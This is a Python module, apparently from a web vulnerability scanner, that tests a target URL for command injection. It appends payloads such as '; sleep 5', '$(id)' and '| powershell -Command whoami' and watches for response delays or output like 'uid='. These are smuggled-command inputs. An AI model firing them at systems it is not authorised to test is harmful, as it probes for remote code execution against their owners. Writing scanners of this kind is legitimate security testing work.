import aiohttp
import logging
from .utils import inject_payload
import time

logger = logging.getLogger(__name__)

async def check_remote_code_execution(target_url):
    vulnerabilities = []
    logger.info("Checking for Remote Code Execution (RCE) vulnerabilities")

    # إعداد الحمولات بشكل متنوع لاختبار أنواع مختلفة من تنفيذ الأوامر
    rce_payloads = [
        "; sleep 5",                   # Unix/Linux - Delay command
        "& timeout /T 5",              # Windows - Delay command
        "|| ping -n 6 127.0.0.1 ||",   # Windows - Ping delay
        "; ping -c 5 127.0.0.1",       # Unix - Ping delay
        "$(id)",                       # Unix - Execute basic command
        "`id`",                        # Unix - Alternate execution
        "| powershell -Command whoami", # Windows - PowerShell command
    ]

    # أنواع مختلفة من Content-Types
    content_types = ["text/plain", "application/xml", "application/json"]

    # إضافة رأسيات متقدمة
    headers = {
        "User-Agent": "Mozilla/5.0 (RCE Scanner)",
        "X-Custom-Header": "TestHeader",
        "Content-Type": content_types[0]  # نبدأ بـ text/plain
    }

    async with aiohttp.ClientSession() as session:
        for payload in rce_payloads:
            # حقن الحمولة
            test_url = inject_payload(target_url, payload)
            try:
                start_time = time.time()
                async with session.get(test_url, headers=headers, timeout=10, ssl=False) as response:
                    if response.status != 200:
                        continue
                        
                    text = await response.text()
                    end_time = time.time()

                    # حساب زمن الرد للتحقق من التأخير
                    response_time = end_time - start_time
                    logger.info(f"Response time: {response_time:.2f} seconds for payload: {payload}")

                    # تحقق من التأخير مع شروط إضافية
                    if response_time >= 5:
                        vulnerabilities.append({
                            "type": "Remote Code Execution (RCE)",
                            "description": f"Possible RCE detected with payload causing delay: {payload}",
                            "location": test_url,
                            "severity": "Critical"
                        })
                        logger.warning(f"RCE vulnerability detected with payload: {payload} based on delay in response")
                        return vulnerabilities

                    # التحقق من محتوى الردود
                    if any(indicator in text.lower() for indicator in ["uid=", "administrator", "root"]):
                        vulnerabilities.append({
                            "type": "Remote Code Execution (RCE)",
                            "description": f"Possible RCE detected with payload: {payload}",
                            "location": test_url,
                            "severity": "Critical"
                        })
                        logger.warning(f"RCE vulnerability detected with payload: {payload} based on response content")
                        return vulnerabilities

                    # تجربة Content-Types مختلفة
                    for content_type in content_types[1:]:
                        headers["Content-Type"] = content_type
                        async with session.get(test_url, headers=headers, timeout=10, ssl=False) as content_response:
                            if content_response.status != 200:
                                continue
                                
                            content_text = await content_response.text()
                            if "rcevulnerable" in content_text:
                                vulnerabilities.append({
                                    "type": "Remote Code Execution (RCE)",
                                    "description": f"Possible RCE detected with payload: {payload} and Content-Type: {content_type}",
                                    "location": test_url,
                                    "severity": "Critical"
                                })
                                logger.warning(f"RCE vulnerability detected with payload: {payload} and Content-Type: {content_type}")
                                return vulnerabilities

            except Exception as e:
                logger.error(f"Error during RCE check with payload '{payload}': {e}")
    
    return vulnerabilities


async def scan(target_url):
    """
    Main scan function that wraps the check_remote_code_execution functionality.
    """
    return await check_remote_code_execution(target_url)
